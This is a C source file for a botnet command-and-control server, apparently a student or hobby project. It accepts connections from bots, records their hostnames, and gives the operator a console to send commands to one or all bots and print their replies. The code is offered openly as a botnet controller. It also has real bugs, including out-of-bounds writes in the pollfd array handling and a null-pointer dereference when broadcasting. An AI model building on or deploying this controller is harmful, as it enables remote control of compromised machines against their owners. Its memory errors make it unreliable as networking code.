// Listens for connection and sends message to connected client
// to compile: gcc server.c -o server -lpthread

/*
Code is void of input sanitation and missing a lot of error checks.
Code does not update array when client disconnects.
Code has no functionality to exit cleanly.exir
*/

#include "simple_networking.h"
#include <poll.h>
#include <pthread.h>
#include <stdio.h>

// Function declarations

void print_connection(connection client_con, int new_fd);
void print_welcome_message();
void print_help_screen();
void print_command_help_screen();
void* handle_connection(void* my_connection);
void* bot_command(void* current);
int append_pfds(struct pollfd *pfds, int new_fd, int fd_count);

// Global Graceful Exit Flag
int exitflag = 0;

// Structure of arguments for use with bot_command and handle_connection functions


static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int main(void)
{
    // Set the client connection to be the head of the list
    connection client_con = bind_socket("127.0.0.1", 8080);
    client_con.next = NULL;


    print_welcome_message();

    // Add listener information to our head's array
    client_con.pfds = malloc(sizeof(struct pollfd));
    client_con.pfds[0].fd = client_con.sock_fd;
    client_con.pfds[0].events = POLLIN;

    pthread_t control_thread, connection_thread;

    // Create thread to control botnet
    pthread_create(&control_thread, NULL, bot_command, &client_con);
    pthread_create(&connection_thread, NULL, handle_connection, &client_con);

    // Wait for threads to finish
    pthread_join(control_thread, NULL);
    pthread_join(connection_thread, NULL);

    // Exit
    return 0;
}

// Handles incomming connections and appends information to array
// This writes data to the connection struct
void* handle_connection(void* arg)
{
    connection* head = (connection *)arg;
    socklen_t client_addr_size;
    int new_fd;
    int fd_count = 1;
    
    printf("[+] Looking for connections\n");

    while(1)
    {

        connection* current = head;

        while (current != NULL)
        {
            // Poll the array for events and set .revents
            int rc = poll(head->pfds, fd_count, -1);

            // Check return code of poll(). Return error if -1
            if (rc == -1)
            {
                perror("[-] Error poll()");
                exit(1);
            }

            // Check if socket is ready to read
            if (head->pfds->revents & POLLIN)
            {
                // If listener is ready to read, handle new connection
                if (head->pfds->fd == head->sock_fd)
                {
                    // Accept queued connection and assign new file descriptor
                    client_addr_size = sizeof(head->client_addr);
                    new_fd = accept(head->sock_fd,
                        (struct sockaddr *)&head->client_addr, &client_addr_size);

                    // Check return code of accept(). Return error if -1
                    if (new_fd == -1)
                    {
                        perror("[-] Error accept()");
                    }
                    else
                    {
                        // Set lock
                        pthread_mutex_lock(&mutex);

                        // Add new connection information to list
                        connection* new_con = create_connection(head, 0);
                        new_con->pfds->fd = new_fd;
                        new_con->pfds->events = POLLIN;

                        // Add connection information to master array
                        fd_count = append_pfds(head->pfds, new_fd, fd_count);

                        // Get hostname from client
                        send(new_con->pfds->fd, "hostname", 8, 0);
                        char recieved_data[8192];
                        int bytes_recv = recv(new_con->pfds->fd, recieved_data, 8192, 0);

                        if (bytes_recv == 0)
                        {
                            // Oops, our recv call failed.
                            printf("[-] Unable to recieve hostname from new client.\n");
                        }
                        
                        // Overwrite the newline char with a null terminator
                        recieved_data[bytes_recv-1] = '\0';
                        
                        new_con->hostname = malloc(bytes_recv);
                        sprintf(new_con->hostname, "%s", recieved_data);
                        printf("New Connection from %s\n", new_con->hostname);

                        // Release lock
                        pthread_mutex_unlock(&mutex);
                    }
                }
            }
            current = current->next;
        }
    }
}

// Append new connection file descriptor to array, returns the number of file descriptors
int append_pfds(struct pollfd *pfds, int new_fd, int fd_count)
{
    // Increment count of assigned file descriptors
    fd_count++;

    // Increase size of array to accomodate new file descriptor
    pfds = realloc(pfds, sizeof(pfds)*fd_count);

    // Add file descriptor to array and set event to check for read
    pfds[fd_count].fd = new_fd;
    pfds[fd_count].events = POLLIN;

    return fd_count;
}


void* bot_command(void* arg)

{
    
    char data[1024];

    connection* head = (connection *)arg;
    connection* tmp = (connection *)malloc(sizeof(connection));

    while(1)
    {
        
        // Prompt user for input and remove trailing newline
        // Indicate user is in 'console' control
        printf("[Console] >> ");
        fgets(data, sizeof(data), stdin);
        data[strcspn(data, "\n")] = 0;

        // print help screen for commands to use in 'console'
        if (strcmp(data, "help") == 0)
        {

            print_help_screen();
        }


        // Display current list of connections
        // John is working to store host names, rather than client 1, 2, 3, etc..
        else if (strcmp(data, "show") == 0)
        {
            // Set lock
            pthread_mutex_lock(&mutex);

            // Omit server info from description
            tmp = head;
            tmp = tmp->next;
            int i = 1;

            // Iterate through array and print client information
            while (tmp != NULL)
            {
                printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
                tmp = tmp->next;
                i++;
            }
            if (i == 1)
            {
                printf("[-] No connections!\n");
            }
            
            // Release lock
             pthread_mutex_unlock(&mutex);
        }
        
        
        // Enter 'command' control
        else if (strcmp(data, "command") == 0)
        {
            printf("\nEnter <help> to display list of available options under the command mode\n");
            printf("\nEnter <back> to exit command mode\n\n");
            while(1)
            {
                // Prompt user for input and remove trailing newline
                printf("[Command] >> ");
                fgets(data, sizeof(data), stdin);
                data[strcspn(data, "\n")] = 0;

                // Print list of commands to use in 'command' control
                if (strcmp(data, "help") == 0)
                {
                    print_command_help_screen();
                }

                // Display current list of connections
                // Currently unsure how to format this feature into a function...
                else if (strcmp(data, "show") == 0)
                {

                  // Set lock
                  pthread_mutex_lock(&mutex);

                  // Omit server info from description
                  tmp = head;
                  tmp = tmp->next;
                  int i = 1;

                  // Iterate through array and print client information
                  while (tmp != NULL)
                  {
                      printf("Client %d - %s - is on fd %d\n", i, tmp->hostname, tmp->sock_fd);
                      tmp = tmp->next;
                      i++;
                  }
                  if (i == 1)
                  {
                      printf("[-] No connections!\n");
                  }

                  // Release lock
                   pthread_mutex_unlock(&mutex);

                }


                

                // Send command to ALL connections except listener
                else if (strcmp(data, "all") == 0)
                {   
                    //this allows consecutive command message to all clients
                    while(1)
                    {
                        // Prompt user for input and remove trailing newline
                        printf("[Command][All] Enter command: ");
                        fgets(data, sizeof(data), stdin);
                        data[strcspn(data, "\n")] = 0;

                        if (strcmp(data,"back") == 0)
                        {
                             break;
                        }

                        // Send data to client specified by user input, based on array index
                        int i = 0;
                        tmp = head;
                        while (tmp != NULL)
                        {
                          tmp = tmp->next;
                          send(tmp->pfds->fd, data, sizeof(data), 0);

                          // Wait for a response
                          char recieved_data[8192];
                          int bytes_recv = recv(tmp->pfds->fd, recieved_data, 8192, 0);

                          if (bytes_recv == 0)
                          {
                            // Oops, our recv call failed.
                            printf("[-] Unable to recieve from %s\n", tmp->hostname);
                          }

                          recieved_data[bytes_recv] = '\0';
                          printf("%s said: %s\n", tmp->hostname, recieved_data);

                            i++;
                        }
                    }
                }

                // Send command to SINGLE client
                else if (strcmp(data, "single") == 0)
                {
                    
                    // Prompt user for input, remove trailing newline and convert input to int
                    printf("[Command][Single] Enter client: ");
                    fgets(data, sizeof(data), stdin);
                    data[strcspn(data, "\n")] = 0;
                    int num = atoi(data);
                  
                    // Sanitise user input
                    if (num > (count_connections(head) - 1))
                    {
                      printf("[-] No such connection %d\n", num);
                      printf("[-] The current number of connections is %d\n", (count_connections(head) - 1));
                      continue;
                    }
                  
                    // Find the correct client in the list
                    int i = 0;
                    tmp = head;
                    while (i < num && tmp != NULL)
                    {
                      tmp = tmp->next;
                      i++;
                    }
                  
                    //while loop allows consecutive command message to the client
                    while(1)
                    {
                        // Prompt user for input and remove trailing newline
                        printf("[command][single][%d] Enter command: ", num);
                        fgets(data, sizeof(data), stdin);
                        data[strcspn(data, "\n")] = 0;
                        
                        if (strcmp(data,"back") == 0)
                        {
                            break;
                        }
                        else 
                        {    // Set lock
                            pthread_mutex_lock(&mutex);

                            send(tmp->pfds->fd, data, sizeof(data), 0);

                            // Wait for a response
                            char recieved_data[8192];
                            int bytes_recv = recv(tmp->pfds->fd, recieved_data, 8192, 0);

                            if (bytes_recv == 0)
                            {
                                // Oops, our recv call failed.
                                printf("[-] Unable to recieve from %s\n", tmp->hostname);
                            }

                            recieved_data[bytes_recv] = '\0';
                            printf("%s said: %s\n", tmp->hostname, recieved_data);


                            // Release lock
                            pthread_mutex_unlock(&mutex);
                        }
                    }
                }
                // Exit command control
                else if (strcmp(data, "back") == 0)
                {
                    break;
                }
            }
        }

        // Exit control of bot
        else if (strcmp(data, "exit") == 0)
        {
            printf("Are You Sure? yes/no\n");
            fgets(data, sizeof(data), stdin);
            data[strcspn(data, "\n")] = 0;  
            while(1)
            {
              if (strcmp(data,"yes") == 0)
              {
                  printf("\nExiting...  \n");
                  exit(0);
              }
              else if (strcmp(data,"no") == 0)
              {
                  break;
              }
            }
        }
    }
}

// Function to print welcome screen
void print_welcome_message()
{
    //system("clear");


    printf("\n******************************************************************************\n");
    printf("dP   dP   dP  88888888b dP         a88888b.  .88888.  8888ba.88ba   88888888b \n");
    printf("88   88   88  88        88        d8'   `88 d8'   `8b 88  `8b  `8b  88        \n");
    printf("88  .8P  .8P  88aaaa    88        88        88     88 88   88   88  88aaaa    \n");
    printf("88  d8'  d8'  88        88        88        88     88 88   88   88  88        \n");
    printf("88.d8P8.d8P   88        88        Y8.   .88 Y8.   .8P 88   88   88  88        \n");
    printf("8888' Y88'    88888888P 88888888P  Y88888P'  `8888P'  dP   dP   dP  88888888P \n");
    printf("******************************************************************************\n\n");
    printf("This is the console page\n");
    printf("Please enter <help> to display a list of available commands\n");
    printf("Enter <exit> to terminate the program\n\n");
    
    return;
}

// Example help screen function
void print_help_screen()
{
    printf("\nCONSOLE PAGE\n\n");
    printf("Options            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connected clients\n");
    printf("help             : List of commands from console    \n");
    printf("exit             : Terminate the program            \n");
    printf("command          : Enter command control mode       \n");
    printf("back             : Back to the previous page        \n");
    printf("=====================================================\n\n");
    return;
}

void print_command_help_screen()
{
    printf("\nCOMMAND PAGE\n\n");
    printf("OPTIONS            DESCRIPTIONS\n");
    printf("=====================================================\n");
    printf("show             : Display list of connections       \n");
    printf("help             : List of commands from console     \n");
    printf("all              : Send command to all connections   \n");
    printf("single           : Send command to a connected client\n");
    printf("back             : back to the previous page         \n");
    printf("=====================================================\n\n");
    return;
}
